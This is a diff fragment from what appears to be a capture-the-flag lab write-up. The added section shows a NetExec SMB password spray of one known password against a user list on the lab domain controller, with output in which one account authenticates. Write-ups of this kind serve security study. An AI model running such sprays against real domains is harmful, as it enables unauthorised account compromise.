@@ -394,3 +394,38 @@ Ph4nt0m@5t4rt!
 
 # Password spray leads to user compromise!
 
+```python
+nxc smb dc.phantom.vl -u users.txt -p 'Ph4nt0m@5t4rt!' --continue-on-success                                                       
+SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.63   445    DC               [-] phantom.vl\Administrator:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\Guest:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\krbtgt:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\DC$:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\svc_sspr:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\rnichols:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\pharrison:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\wsilva:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\elynch:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\nhamilton:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\lstanley:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\bbarnes:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\cjones:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\agarcia:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\ppayne:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [+] phantom.vl\ibryant:Ph4nt0m@5t4rt! 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\ssteward:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\wstewart:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\vhoward:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\crose:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\twright:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\fhanson:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\cferguson:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\alucas:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\ebryant:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\vlynch:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\ghall:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\ssimpson:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\ccooper:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\vcunningham:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
+```
+
